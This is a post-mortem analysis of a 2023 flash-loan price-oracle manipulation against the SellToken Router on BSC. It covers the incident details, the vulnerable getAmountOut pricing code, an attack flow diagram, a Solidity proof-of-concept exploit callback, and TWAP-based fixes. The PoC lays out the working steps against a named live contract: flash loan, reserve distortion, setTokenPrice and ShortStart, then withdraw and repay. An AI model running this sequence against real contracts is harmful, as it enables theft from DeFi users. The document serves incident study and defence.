# SellToken — getAmountOut Price Oracle Manipulation Analysis

| Field | Details |
|------|------|
| **Date** | 2023-05-19 |
| **Protocol** | SellToken Router |
| **Chain** | BSC |
| **Loss** | Unknown |
| **Attacker** | Unknown |
| **Attack Tx** | [0x7d04e953...](https://explorer.phalcon.xyz/tx/bsc/0x7d04e953dad4c880ad72b655a9f56bc5638bf4908213ee9e74360e56fa8d7c6a) |
| **Vulnerable Contract** | [0x57Db1912...](https://bscscan.com/address/0x57Db19127617B77c8abd9420b5a35502b59870D6) |
| **Root Cause** | `getAmountOut` used as a token price oracle — AMM spot reserve-based, manipulable within a single block |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-05/SellToken_exp.sol) |

---
## 1. Vulnerability Overview

The `ShortStart()` function of SellToken Router calculates the token price via `getToken2Price()`, which internally uses UniswapV2's `getAmountOut` as the spot price. By manipulating the liquidity pool's reserves with a flash loan, the `getAmountOut` return value can be distorted, allowing a position to be opened under favorable conditions.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable price calculation: uses UniswapV2 getAmountOut
function getToken2Price(
    address token,
    address bnbOrUsdt,
    uint256 bnb
) external returns (uint256) {
    // ❌ Spot price — reserves can be manipulated via flash loan
    uint256 price = IUniswapV2Router(router).getAmountOut(
        bnb,
        reserve0,  // ❌ Manipulable LP reserve
        reserve1
    );
    return price;
}

// ❌ ShortStart: opens position using manipulated price
function ShortStart(address coin, address addr, uint256 terrace) external payable {
    uint256 price = getToken2Price(coin, wbnb, msg.value);
    // ❌ Short position opened with manipulated price → profit
}
```

```solidity
// ✅ Fix: use TWAP-based price
function getToken2Price(address token, address bnbOrUsdt, uint256 bnb) external returns (uint256) {
    // ✅ Use UniswapV2 TWAP or Chainlink oracle
    return getTWAPPrice(token, bnbOrUsdt, bnb);
}
```

### On-chain Original Code

Source: Bytecode decompilation

```solidity
// Root cause: `getAmountOut` used as a token price oracle — AMM spot reserve-based, manipulable within a single block
// Source code unverified — based on bytecode analysis
```

## 3. Attack Flow

```
┌─────────────────────────────────────┐
│  1. Borrow WBNB via DODO flash loan │
└─────────────────┬───────────────────┘
                  ▼
┌─────────────────────────────────────┐
│  2. Swap large amount WBNB → SELLC  │
│     → Distort SELLC/WBNB pair       │
│       reserve                       │
└─────────────────┬───────────────────┘
                  ▼
┌─────────────────────────────────────┐
│  3. ShortStart(SELLC, addr, amount) │
│     getToken2Price() → distorted    │
│     price → open short position     │
│     under favorable conditions      │
└─────────────────┬───────────────────┘
                  ▼
┌─────────────────────────────────────┐
│  4. Collect profit via withdraw()   │
│  5. Re-sell SELLC → WBNB           │
│  6. Repay flash loan + realize gain │
└─────────────────────────────────────┘
```

## 4. PoC Code

```solidity
function DODOFlashLoanCallback(address, uint256 amount, uint256, bytes calldata) external {
    // 1. Buy large amount of SELLC → distort reserves
    wbnb.approve(address(p_router), type(uint256).max);
    address[] memory path = new address[](2);
    path[0] = address(wbnb);
    path[1] = address(SELLC);
    p_router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
        amount * 9 / 10, 0, path, address(this), block.timestamp
    );

    // 2. Call ShortStart with distorted price
    wbnb.approve(address(s_router), type(uint256).max);
    // Manipulate price via setTokenPrice, then call ShortStart
    s_router.setTokenPrice(address(SELLC));
    s_router.ShortStart{value: 0}(address(SELLC), address(this), amount / 10);

    // 3. Collect profit
    s_router.withdraw(address(wbnb));

    // 4. Re-sell SELLC → WBNB
    path[0] = address(SELLC);
    path[1] = address(wbnb);
    SELLC.approve(address(p_router), type(uint256).max);
    p_router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
        SELLC.balanceOf(address(this)), 0, path, address(this), block.timestamp
    );

    // 5. Repay flash loan
    wbnb.transfer(address(oracle1), amount);
}
```

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matching Pattern |
|----|--------|--------|-----|-----------|
| V-01 | getAmountOut Price Oracle | CRITICAL | CWE-1041 | 04_oracle_manipulation.md |
| V-02 | Flash Loan Reserve Manipulation | HIGH | CWE-682 | 02_flash_loan.md |

### V-01: getAmountOut Spot Price Oracle
- **Description**: `getAmountOut` is calculated from the current reserve ratio and can be immediately manipulated via flash loan
- **Impact**: Short/long positions opened under favorable conditions for illicit profit
- **Attack Conditions**: Flash loan access, permission to call `ShortStart` function

## 6. Remediation Recommendations

### Immediate Actions
```solidity
// ✅ Use TWAP-based price
function getToken2Price(address token, address quote, uint256 amount) external view returns (uint256) {
    // Use 30-minute TWAP
    return oracle.consult(token, amount, quote);
}
```

### Structural Improvements
| Vulnerability | Recommended Action |
|--------|-----------|
| Spot price oracle | Apply TWAP or Chainlink price feed |
| Single-block manipulation | Set price deviation threshold (e.g., block trades on ±5% or more) |
| setTokenPrice access | Restrict to `onlyOwner` or whitelisted callers |

## 7. Lessons Learned

1. Using DEX `getAmountOut` or spot reserve ratios as a price oracle is vulnerable to flash loan attacks.
2. Price calculations in financial position-opening functions must use manipulation-resistant oracles (TWAP, Chainlink).
3. Functions that directly set prices, such as `setTokenPrice`, become an additional attack vector if not properly access-controlled.